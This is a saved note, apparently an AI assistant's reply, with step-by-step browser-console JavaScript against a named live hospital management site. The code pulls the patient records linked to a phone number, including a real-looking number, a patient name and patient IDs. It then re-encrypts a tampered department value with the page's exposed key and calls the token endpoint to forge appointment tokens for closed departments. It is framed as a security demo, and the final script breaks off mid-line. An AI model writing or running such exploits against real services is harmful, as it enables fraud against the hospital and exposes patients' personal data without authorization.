{
  "id": "nn_mq3r1wsa_5xg3z4fcd",
  "title": "Console",
  "content": "<p>Absolutely. Let’s create a <strong>step‑by‑step console journey</strong> that mirrors the actual user flow — but entirely through the browser console, with <strong>pauses and explanations</strong> so you can demonstrate each phase like a security walkthrough.</p>\n<p>Below are <strong>six blocks of code</strong> that you can paste <strong>one at a time</strong> into the console while on <code>https://hms.canwinn.in/token_first</code>. After each block, you can explain what’s happening. The final block will successfully generate a token for a closed OPD (e.g. General Physician) even though it’s not in the dropdown.</p>\n<hr>\n<h2>🧭 Step 0: Ensure we are on the correct page</h2>\n<p><em>(Run this first to verify the environment)</em></p>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><span class=\"hljs-comment\">// Check that we are on the right page and that CryptoJS is available</span>\n<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Page URL:\"</span>, <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">location</span>.<span class=\"hljs-property\">href</span>);\n<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"CryptoJS loaded:\"</span>, <span class=\"hljs-keyword\">typeof</span> <span class=\"hljs-title class_\">CryptoJS</span> !== <span class=\"hljs-string\">'undefined'</span> ? <span class=\"hljs-string\">'Yes ✅'</span> : <span class=\"hljs-string\">'No ❌'</span>);\n<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"encryptData function exists:\"</span>, <span class=\"hljs-keyword\">typeof</span> encryptData === <span class=\"hljs-string\">'function'</span> ? <span class=\"hljs-string\">'Yes ✅'</span> : <span class=\"hljs-string\">'No ❌'</span>);\n</code></pre></div>\n<hr>\n<h2>1️⃣ Fetch all patients for a mobile number</h2>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><span class=\"hljs-comment\">// API call used by the page when you type a mobile number</span>\n<span class=\"hljs-keyword\">let</span> mobileNumber = <span class=\"hljs-string\">\"9871751631\"</span>;  <span class=\"hljs-comment\">// Change to any valid mobile</span>\n<span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`token_first?mobile=<span class=\"hljs-subst\">${mobileNumber}</span>&amp;ajax=1`</span>)\n  .<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">res</span> =&gt;</span> res.<span class=\"hljs-title function_\">json</span>())\n  .<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">data</span> =&gt;</span> {\n      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"📋 Patients found:\"</span>);\n      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">table</span>(data.<span class=\"hljs-property\">data</span>);   <span class=\"hljs-comment\">// nice table view in the console</span>\n      <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">patientsList</span> = data.<span class=\"hljs-property\">data</span>; <span class=\"hljs-comment\">// save for later</span>\n  })\n  .<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">err</span> =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(<span class=\"hljs-string\">\"Fetch failed:\"</span>, err));\n</code></pre></div>\n<p><strong>What it does:</strong> Uses the same endpoint the page uses to load the patient modal. Stores the array in <code>window.patientsList</code>.</p>\n<hr>\n<h2>2️⃣ Select a patient from the list (e.g. MEET KHURANA)</h2>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><font color=\"#ff7b72\">\n// Variable ka naam badal kar 'myPatient' kar diya hai\nvar myPatient = window.patientsList.find(p =&gt; p.patientId == \"12313\");\n\nif (!myPatient) {\n    console.error(\"Patient not found. Check the ID or list above.\");\n} else {\n    console.log(\"👤 Selected patient:\", myPatient.patientInitial, myPatient.patientName);\n    console.log(\"   Patient ID (UHID):\", myPatient.patientId);\n    window.selectedPatient = myPatient; // Global variable mein save kar diya\n}</font></code></pre></div>\n<p><strong>What it does:</strong> Exactly like clicking “Select” in the patient modal. The chosen patient’s data (name, UHID, mobile) will be used to build the token request.</p><p><br></p><p><br></p><p><br></p><p>\n\n</p><div class=\"code-block-wrapper\" contenteditable=\"false\"><button class=\"copy-code-btn\">Copy</button><pre style=\"color:rgb(249, 250, 251)\" contenteditable=\"true\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>select</span> <span style=\"color:rgb(230, 211, 122)\">id</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>department<span style=\"color:rgb(102, 204, 204)\">\"</span></span> <span style=\"color:rgb(230, 211, 122)\">class</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>form-select<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>2<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>AYURVEDA<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>3<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>CARDIOLOGY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>4<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>DENTAL<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>5<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>DERMATOLOGY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>6<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>DIETICIAN &amp; NUTRITION<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>8<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>EMERGENCY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>10<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>GASTROENTEROLOGY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>11<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>GYNAECOLOGY &amp; OBSTETRICS<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>17<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>NEPHROLOGY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>21<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>ONCOLOGY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>35<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>RMO<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>39<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>DIETICIAN<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>49<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>HOMEOPATHY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>51<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>PSYCHOLOGY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>56<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>EYE<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>57<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>SURGEON<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>59<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>GENERAL PHYSICIAN<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>61<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>DIABETOLOGY<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>66<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>ORTHOPEDIC SPINE SPECIALIST<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>77<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>PEDIATRIC CARDIOLOGIST<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n        <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;</span>option</span> <span style=\"color:rgb(230, 211, 122)\">value</span><span style=\"color:rgb(145, 208, 118)\"><span style=\"color:rgb(102, 204, 204)\">=</span><span style=\"color:rgb(102, 204, 204)\">\"</span>81<span style=\"color:rgb(102, 204, 204)\">\"</span></span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>NEUROSURGEON<span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>option</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span>\n      <span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\"><span style=\"color:rgb(102, 204, 204)\">&lt;/</span>select</span><span style=\"color:rgb(102, 204, 204)\">&gt;</span></span></pre></div>\n\n<br><p></p>\n<hr>\n<h2>3️⃣ Build the token request payload</h2>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><span class=\"hljs-comment\">// Here we craft the object the page would normally build from the form.</span>\n<span class=\"hljs-comment\">// The 'department' value is the numeric code from the dropdown.</span>\n<span class=\"hljs-comment\">// We will use \"59\" = GENERAL PHYSICIAN, which is closed today and NOT in the dropdown.</span>\n<span class=\"hljs-keyword\">let</span> closedDepartmentCode = <span class=\"hljs-string\">\"59\"</span>;  <span class=\"hljs-comment\">// General Physician</span>\n\n<span class=\"hljs-keyword\">let</span> payload = {\n    <span class=\"hljs-attr\">full_name</span>: <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">selectedPatient</span>.<span class=\"hljs-property\">patientName</span>,\n    <span class=\"hljs-attr\">mobile</span>: <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">selectedPatient</span>.<span class=\"hljs-property\">mobileNumber</span>,\n    <span class=\"hljs-attr\">department</span>: closedDepartmentCode,   <span class=\"hljs-comment\">// the tampered value</span>\n    <span class=\"hljs-title class_\">Uhid</span>: <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">selectedPatient</span>.<span class=\"hljs-property\">patientId</span>,\n    <span class=\"hljs-attr\">patientInitial</span>: <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">selectedPatient</span>.<span class=\"hljs-property\">patientInitial</span> || <span class=\"hljs-string\">\"\"</span>\n};\n\n<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"📦 Payload to be sent:\"</span>, payload);\n<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">payload</span> = payload;\n</code></pre></div>\n<p><strong>What it does:</strong> Prepares the exact JSON that the page’s <code>encryptData</code> function would receive from the form. The <code>department</code> field is the one we are manipulating – normally it would be whatever the user selects in the dropdown, but here we hardcode the closed OPD’s code.</p>\n<hr>\n<h2>4️⃣ Encrypt the payload using the same key</h2>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><span class=\"hljs-comment\">// The page's encryptData() function uses CryptoJS AES with the hardcoded key.</span>\n<span class=\"hljs-comment\">// We can call it directly because we are on the same page.</span>\n<span class=\"hljs-keyword\">let</span> encryptedPayload = <span class=\"hljs-title function_\">encryptData</span>(<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">payload</span>);\n<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"🔐 Encrypted payload (first 30 chars):\"</span>, encryptedPayload.<span class=\"hljs-title function_\">substring</span>(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">30</span>) + <span class=\"hljs-string\">\"...\"</span>);\n<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">encryptedPayload</span> = encryptedPayload;\n</code></pre></div>\n<p><strong>What it does:</strong> Demonstrates that the encryption key is accessible, so anyone can create a valid encrypted blob. This is the same string that gets appended to the URL in <code>generate_token.php?data=...</code></p>\n<hr>\n<h2>5️⃣ Send the request to generate a token</h2>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><span class=\"hljs-comment\">// The final call – identical to what the \"Submit\" button does.</span>\n<span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`generate_token.php?data=<span class=\"hljs-subst\">${<span class=\"hljs-built_in\">encodeURIComponent</span>(<span class=\"hljs-variable language_\">window</span>.encryptedPayload)}</span>`</span>)\n  .<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">res</span> =&gt;</span> res.<span class=\"hljs-title function_\">json</span>())\n  .<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">response</span> =&gt;</span> {\n      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"📩 Server response:\"</span>);\n      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(response);\n      <span class=\"hljs-keyword\">if</span> (response.<span class=\"hljs-property\">success</span>) {\n          <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`🚨 SUCCESS! Token for CLOSED OPD generated!`</span>);\n          <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`   Token No: <span class=\"hljs-subst\">${response.token_no}</span>`</span>);\n          <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`   Patient ID: <span class=\"hljs-subst\">${response.patientId}</span>`</span>);\n          <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`   ➡️ This token was issued for department code \"<span class=\"hljs-subst\">${closedDepartmentCode}</span>\" which is NOT available in the UI.`</span>);\n      } <span class=\"hljs-keyword\">else</span> {\n          <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">warn</span>(<span class=\"hljs-string\">\"⛔ Token not generated. Reason:\"</span>, response.<span class=\"hljs-property\">message</span>);\n      }\n      <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">tokenResponse</span> = response;\n  })\n  .<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">err</span> =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(<span class=\"hljs-string\">\"🌐 Network error:\"</span>, err));\n</code></pre></div>\n<p><strong>What it does:</strong> Sends the forged request. If the server returns <code>success: true</code>, you have concrete proof that the OPD availability is not enforced server‑side. The generated token number (e.g., <code>GENER59_27</code>) is valid and would be accepted at the registration counter.</p>\n<hr>\n<h2>🧹 (Optional) Reset everything for another demo</h2>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><span class=\"hljs-keyword\">delete</span> <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">patientsList</span>;\n<span class=\"hljs-keyword\">delete</span> <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">selectedPatient</span>;\n<span class=\"hljs-keyword\">delete</span> <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">payload</span>;\n<span class=\"hljs-keyword\">delete</span> <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">encryptedPayload</span>;\n<span class=\"hljs-keyword\">delete</span> <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">tokenResponse</span>;\n<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"🧹 Console state cleared. Ready for next demo.\"</span>);\n</code></pre></div>\n<hr>\n<h2>📝 Complete all‑in‑one script (if you want to run in one shot)</h2>\n<div class=\"code-block-wrapper\" contenteditable=\"false\"><span class=\"code-lang-label\">javascript</span><button class=\"copy-code-btn\">Copy</button><pre><code class=\"language-javascript hljs\" contenteditable=\"true\" data-highlighted=\"yes\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">runFullDemo</span>(<span class=\"hljs-params\"></span>) {\n    <span class=\"hljs-keyword\">let</span> mobile = <span class=\"hljs-string\">\"9871751631\"</span>;\n    <span class=\"hljs-keyword\">let</span> targetPatientId = <span class=\"hljs-string\">\"14178\"</span>;\n    <span class=\"hljs-keyword\">let</span> closedDeptCode = <span class=\"hljs-string\">\"59\"</span>;  <span class=\"hljs-comment\">// General Physician</span>\n\n    <span class=\"hljs-comment\">// Step 1: Fetch patients</span>\n    <span class=\"hljs-keyword\">let</span> res1 = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`token_first?mobile=<span class=\"hljs-subst\">${mobile}</span>&amp;ajax=1`</span>);\n    <span class=\"hljs-keyword\">let</span> data1 = <span class=\"hljs-keyword\">await</span> res1.<span class=\"hljs-title function_\">json</span>();\n    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">table</span>(data1.<span class=\"hljs-property\">data</span>);\n\n    <span class=\"hljs-comment\">// Step 2: Select patient</span>\n    <span class=\"hljs-keyword\">let</span> patient = data1.<span class=\"hljs-property\">data</span>.<span class=\"hljs-title function_\">find</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">p</span> 